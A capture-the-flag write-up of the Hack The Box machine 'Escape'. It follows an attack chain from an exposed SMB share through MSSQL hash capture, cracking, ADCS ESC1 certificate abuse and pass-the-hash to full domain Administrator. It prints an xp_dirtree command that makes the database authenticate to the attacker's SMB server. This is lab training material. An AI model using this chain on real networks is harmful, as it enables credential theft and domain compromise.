---
layout: post
title: "Escape - Hack The Box"
summary: "SMB Null → PDF file → MSSQL credentials → MSSQLClient → xp_dirtree to obtain NTLMv2 Hash → Crack the hash → SQL Server Logs containing user credentials → certipy → ADCS ESC1 → Administrator"
---

# Escape - Hack The Box

## Enumeration
### Nmap
Nmap scan results showed services like LDAP and Kerberos, which are commonly used in Active Directory. This indicates the target is likely a Domain Controller.

![00 - nmap output](https://github.com/user-attachments/assets/5943dee8-f85a-463e-87fb-deb4f0b09d82)

### SMB
After enumerating SMB shares, I discovered a non-standard share named Public, which contained a readable PDF file related to SQL procedures.

![01 - smbclient](https://github.com/user-attachments/assets/0bf4b150-9cdd-49e4-919c-a9ceee2cb069)

The SQL Procedures file contained credentials for a guest user, which allowed us to authenticate to the MSSQL service.

![02 - sql procedures pdf](https://github.com/user-attachments/assets/6c137497-1a64-4615-b92f-f96079aaed31)

## Exploitation
### Getting Service Account
To retrieve the service account running MSSQL, I set up an SMB server locally and executed the following command on the database:
EXEC master.sys.xp_dirtree '\\10.10.14.8\smbshare', 1, 1;

![03 - auth to smb](https://github.com/user-attachments/assets/b11d40a1-3100-46e9-b928-f2a103afc028)

As a result, I captured the NetNTLMv2 hash on my SMB server.

![04 - sql_svc](https://github.com/user-attachments/assets/caa8e5a5-69b6-4e66-828b-170d549c2609)

I then proceeded to crack the captured hash.

![05 - start crack](https://github.com/user-attachments/assets/b731817f-646c-452c-a44d-24b490c8aad0)

![06 - cracked](https://github.com/user-attachments/assets/efbaf1ea-db42-4c3d-b482-fde0a3a15cc2)

### Getting User
Using the service account credentials, I performed credential harvesting and discovered user credentials stored within the SQL Server logs.

![07 - ryan password on logs](https://github.com/user-attachments/assets/e6d2e720-eb0e-42fd-a9d3-bec5d854e9a7)

I then gained user access via Evil-WinRM, as the WinRM service was open.

![08 - got the user](https://github.com/user-attachments/assets/553bfee0-7820-4e6d-912b-0586a2a1eead)

## Privilege Escalation
### ADCS - ESC1
After gaining access to the user account, I was initially unsure how to proceed. Upon reviewing the hint, I realized that the environment had a vulnerable Active Directory Certificate Services (ADCS) setup.
I then used Certipy to enumerate the ADCS configuration and identified an ESC1 (Enrollment Services Configuration #1) vulnerability.

![09 - certipy linux](https://github.com/user-attachments/assets/a8e4910d-94fb-4a59-8ac7-68b4b0b3fd56)

![10 - certificate template](https://github.com/user-attachments/assets/7b6c74c8-8651-4d29-86a1-0fba5a2870a3)

From there, the process was straightforward: I impersonated the Administrator account to request an ADCS certificate, then used that certificate to obtain a Kerberos Ticket Granting Ticket (TGT) encrypted with the Administrator’s NTLM hash, which I then extracted to recover the Administrator hash.

![11 - request](https://github.com/user-attachments/assets/db601f77-b41c-4eac-8e16-2e6506ae19c9)

![12 - hash](https://github.com/user-attachments/assets/8973a740-83db-417b-a88f-752414a3ca77)

Finally, I executed a pass-the-hash attack with Evil‑WinRM and obtained an Administrator shell.

![13 - got it](https://github.com/user-attachments/assets/6d19738a-5842-4500-8330-4790d29710bd)

At that point, the machine was fully compromised.

![pwned](https://github.com/user-attachments/assets/d3b121dc-27e3-4576-b5b2-4f005f675e78)

For more information about ADCS Privilege Escalation checkout below links:

- https://www.nccgroup.com/us/research-blog/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/
- https://abrictosecurity.com/pentesting-active-directory-certificate-services-adcs-esc1-esc8/
